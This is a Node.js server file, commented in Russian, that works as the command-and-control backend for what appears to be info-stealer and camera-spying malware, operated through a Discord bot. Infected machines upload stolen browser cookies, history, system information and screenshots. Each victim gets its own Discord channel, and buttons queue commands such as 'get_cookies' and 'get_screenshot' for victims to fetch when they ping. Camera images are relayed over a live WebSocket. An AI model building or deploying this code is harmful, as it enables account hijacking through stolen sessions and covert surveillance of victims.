// server.js
import express from "express";
import { 
    Client, 
    GatewayIntentBits, 
    ActionRowBuilder, 
    ButtonBuilder, 
    ButtonStyle, 
    ChannelType 
} from "discord.js";
import { WebSocketServer } from "ws";
import http from "http";
import crypto from "crypto";
import path from "path";
import { fileURLToPath } from "url";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
app.use(express.json({ limit: "100mb" }));
app.use(express.static(path.join(__dirname, "public"))); // для cams.html

// ---------- Конфигурация ----------
const DISCORD_BOT_TOKEN = process.env.DISCORD_BOT_TOKEN;
const GUILD_ID = process.env.GUILD_ID;

const CATEGORY_BASE_PC = "Все ПК";
const CATEGORY_BASE_CAM = "Камеры";
const CATEGORY_ARCHIVE_CAM = "Архив камер";
const LOG_CATEGORY = "Логи";
const LOG_CHANNEL = "server-logs";

const ONLINE_TIMEOUT = 3 * 60 * 1000;
const MAX_FILE_SIZE = 6 * 1024 * 1024;
const CAM_INACTIVE_THRESHOLD = 2 * 60 * 1000; // 2 минуты

// ---------- Состояние ----------
const onlinePCs = {};
const pendingCommands = {};
const pcData = {};
const channelByPC = {};
const channelByCam = {};
const wsCameraClients = {};
const camLastUpload = {};

let logCategoryCache = null;
let logChannelCache = null;
let categoryCacheByGuild = new Map();
let channelCacheByGuild = new Map();

// ---------- Discord Bot ----------
const bot = new Client({ intents: [GatewayIntentBits.Guilds] });
bot.once("ready", () => console.log(`✅ Бот вошёл как ${bot.user.tag}`));
bot.login(DISCORD_BOT_TOKEN);

// ---------- Утилиты ----------
function shortHash(s, len = 8) { 
    return crypto.createHash('sha1').update(s).digest('hex').slice(0, len); 
}
function safeChannelName(prefix, id) { 
    return `${prefix}-${shortHash(id, 8)}`.toLowerCase().replace(/[^a-z0-9\-]/g, '-').slice(0, 90); 
}

async function logToDiscord(msg) {
    try {
        const guild = await bot.guilds.fetch(GUILD_ID);
        const channel = await getOrCreateLogChannel(guild);
        await channel.send(`[${new Date().toISOString()}] ${msg}`);
        console.log(`[LOG] ${msg}`);
    } catch (e) { console.error("Ошибка логирования:", e); }
}

async function getOrCreateCategory(guild, name) {
    const gid = guild.id;
    if (!categoryCacheByGuild.has(gid)) categoryCacheByGuild.set(gid, {});
    const cache = categoryCacheByGuild.get(gid);
    if (cache[name]) return cache[name];

    const channels = await guild.channels.fetch();
    const matches = channels.filter(c => c.type === ChannelType.GuildCategory && c.name === name);
    if (matches.size >= 1) { cache[name] = matches.first(); return matches.first(); }

    const created = await guild.channels.create({ name, type: ChannelType.GuildCategory });
    cache[name] = created;
    return created;
}

async function getOrCreateTextChannel(guild, name, parentId) {
    const gid = guild.id;
    if (!channelCacheByGuild.has(gid)) channelCacheByGuild.set(gid, {});
    const cache = channelCacheByGuild.get(gid);
    const key = `${name}::${parentId}`;
    if (cache[key]) return cache[key];

    const channels = await guild.channels.fetch();
    const matches = channels.filter(c => c.type === ChannelType.GuildText && c.name === name && c.parentId === parentId);
    if (matches.size >= 1) { cache[key] = matches.first(); return matches.first(); }

    const created = await guild.channels.create({ name, type: ChannelType.GuildText, parent: parentId });
    cache[key] = created;
    await logToDiscord(`Создан канал ${name}`);
    return created;
}

async function getOrCreateLogChannel(guild) {
    if (logChannelCache) return logChannelCache;
    const category = logCategoryCache || await getOrCreateCategory(guild, LOG_CATEGORY);
    logCategoryCache = category;

    const channels = await guild.channels.fetch();
    const matches = channels.filter(c => c.type === ChannelType.GuildText && c.name === LOG_CHANNEL && c.parentId === category.id);
    if (matches.size > 0) { logChannelCache = matches.first(); return matches.first(); }

    const created = await guild.channels.create({ name: LOG_CHANNEL, type: ChannelType.GuildText, parent: category.id });
    logChannelCache = created;
    return created;
}

// ---------- Кнопки управления ----------
function createControlButtons(pcId) {
    const safePcId = encodeURIComponent(pcId);
    return [new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId(`check_online|${safePcId}`).setLabel("Чек онлайн").setStyle(ButtonStyle.Primary),
        new ButtonBuilder().setCustomId(`get_cookies|${safePcId}`).setLabel("Куки").setStyle(ButtonStyle.Success),
        new ButtonBuilder().setCustomId(`get_history|${safePcId}`).setLabel("История").setStyle(ButtonStyle.Success),
        new ButtonBuilder().setCustomId(`get_system|${safePcId}`).setLabel("Системная").setStyle(ButtonStyle.Secondary),
        new ButtonBuilder().setCustomId(`get_screenshot|${safePcId}`).setLabel("Скриншот").setStyle(ButtonStyle.Secondary)
    )];
}

// ---------- Обработка кнопок ----------
bot.on("interactionCreate", async interaction => {
    if (!interaction.isButton()) return;
    const [command, encodedPcId] = interaction.customId.split("|");
    const pcId = decodeURIComponent(encodedPcId);

    if (!pendingCommands[pcId]) pendingCommands[pcId] = [];
    pendingCommands[pcId].push(command);

    await interaction.reply({ content: `✅ Команда "${command}" отправлена ПК ${pcId}`, ephemeral: true });
});

// ---------- Функция безопасной резки файлов ----------
function safeFileChunking(str, maxBytes) {
    const chunks = [];
    let i = 0;
    while (i < str.length) {
        let chunk = str.slice(i, i + maxBytes);
        chunks.push(chunk);
        i += maxBytes;
    }
    return chunks;
}

async function sendJsonFile(channel, nameBase, jsonData) {
    const str = JSON.stringify(jsonData, null, 2);
    if (Buffer.byteLength(str) <= MAX_FILE_SIZE) {
        await channel.send({ files: [{ attachment: Buffer.from(str), name: `${nameBase}.json` }] });
    } else {
        const chunks = safeFileChunking(str, MAX_FILE_SIZE);
        for (let i = 0; i < chunks.length; i++) {
            await channel.send({
                content: `📄 Файл ${nameBase} часть ${i+1}/${chunks.length}`,
                files: [{ attachment: Buffer.from(chunks[i]), name: `${nameBase}-part${i+1}.json` }]
            });
        }
    }
}

// ---------- Upload PC ----------
app.post("/upload-pc", async (req, res) => {
    try {
        const { pcId, cookies, history, systemInfo, screenshot } = req.body;
        if (!pcId) return res.status(400).json({ error: "pcId required" });

        onlinePCs[pcId] = Date.now();
        pcData[pcId] = { cookies, history, systemInfo, screenshot };

        const guild = await bot.guilds.fetch(GUILD_ID);
        const category = await getOrCreateCategory(guild, CATEGORY_BASE_PC);
        const channelName = safeChannelName('pc', pcId);
        let finalChannel = null;
        let isNewPc = false;

        if (channelByPC[pcId]) finalChannel = await guild.channels.fetch(channelByPC[pcId]).catch(() => null);
        if (!finalChannel) {
            finalChannel = await getOrCreateTextChannel(guild, channelName, category.id);
            channelByPC[pcId] = finalChannel.id;
            isNewPc = true;
        }

        if (isNewPc) {
            const logChannel = await getOrCreateLogChannel(guild);
            await logChannel.send(`🚀 Новый ПК подключен: **${pcId}** <@everyone>`);
        }

        if (cookies) await sendJsonFile(finalChannel, `${channelName}-cookies`, cookies);
        if (history) await sendJsonFile(finalChannel, `${channelName}-history`, history);
        if (systemInfo) await sendJsonFile(finalChannel, `${channelName}-system`, systemInfo);
        if (screenshot) {
            await finalChannel.send({ files: [{ attachment: Buffer.from(screenshot, "base64"), name: `${channelName}-screenshot.jpeg` }] });
        }

        const messageOptions = { content: `🟢 ПК **${pcId}** обновлён`, components: createControlButtons(pcId) };
        await finalChannel.send(messageOptions);

        res.json({ success: true });
    } catch (e) {
        await logToDiscord(`❌ Ошибка upload-pc: ${e.message}`);
        res.status(500).json({ error: e.message });
    }
});

// ---------- Ping ----------
app.post("/ping", (req, res) => {
    const { pcId } = req.body;
    if (!pcId) return res.status(400).json({ error: "pcId required" });
    onlinePCs[pcId] = Date.now();
    const commands = pendingCommands[pcId] || [];
    pendingCommands[pcId] = [];
    res.json({ commands });
});

// ---------- Upload Cam ----------
app.post("/upload-cam", async (req, res) => {
    try {
        const { camId, screenshot, cookies } = req.body;
        if (!camId || !screenshot) return res.status(400).json({ error: "camId and screenshot required" });

        const guild = await bot.guilds.fetch(GUILD_ID);
        const isInactive = Date.now() - (camLastUpload[camId] || 0) > CAM_INACTIVE_THRESHOLD;
        const categoryName = isInactive ? CATEGORY_ARCHIVE_CAM : CATEGORY_BASE_CAM;
        const category = await getOrCreateCategory(guild, categoryName);

        const channelName = safeChannelName('cam', camId);
        let finalChannel = null;
        let isNewCam = false;

        if (channelByCam[camId]) finalChannel = await guild.channels.fetch(channelByCam[camId]).catch(() => null);
        if (!finalChannel || finalChannel.parentId !== category.id) {
            finalChannel = await getOrCreateTextChannel(guild, channelName, category.id);
            channelByCam[camId] = finalChannel.id;
            isNewCam = true;
        }

        if (isNewCam) {
            const logChannel = await getOrCreateLogChannel(guild);
            await logChannel.send(`🚀 Новая камера подключена: **${camId}** <@everyone>`);
        }

        const buffer = Buffer.from(screenshot, "base64");
        if (buffer.length <= MAX_FILE_SIZE) {
            await finalChannel.send({ content: `📷 Новое изображение с камеры **${camId}** (${new Date().toLocaleTimeString()})`, files: [{ attachment: buffer, name: `${channelName}.jpg` }] });
        }

        if (cookies) await sendJsonFile(finalChannel, `${channelName}-cookies`, cookies);

        camLastUpload[camId] = Date.now();

        if (wsCameraClients[camId]) {
            wsCameraClients[camId].forEach(ws => { try { ws.send(JSON.stringify({ camId, screenshot })); } catch (e) {} });
        }

        res.json({ success: true });
    } catch (e) {
        await logToDiscord(`❌ Ошибка upload-cam: ${e.message}`);
        res.status(500).json({ error: e.message });
    }
});

// ---------- WebSocket ----------
const wss = new WebSocketServer({ noServer: true });
wss.on("connection", (ws, req) => {
    const url = new URL(req.url, `http://${req.headers.host}`);
    const camId = url.searchParams.get("camId") || "all";
    if (!wsCameraClients[camId]) wsCameraClients[camId] = [];
    wsCameraClients[camId].push(ws);

    ws.on("close", () => {
        wsCameraClients[camId] = wsCameraClients[camId].filter(c => c !== ws);
    });
});

// ---------- Запуск ----------
const server = http.createServer(app);
server.on("upgrade", (req, socket, head) => {
    wss.handleUpgrade(req, socket, head, ws => wss.emit("connection", ws, req));
});
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`🚀 Сервер слушает порт ${PORT}`));

process.on("uncaughtException", e => logToDiscord(`💥 Uncaught Exception: ${e.message}`));
process.on("unhandledRejection", e => logToDiscord(`💥 Unhandled Rejection: ${e}`));
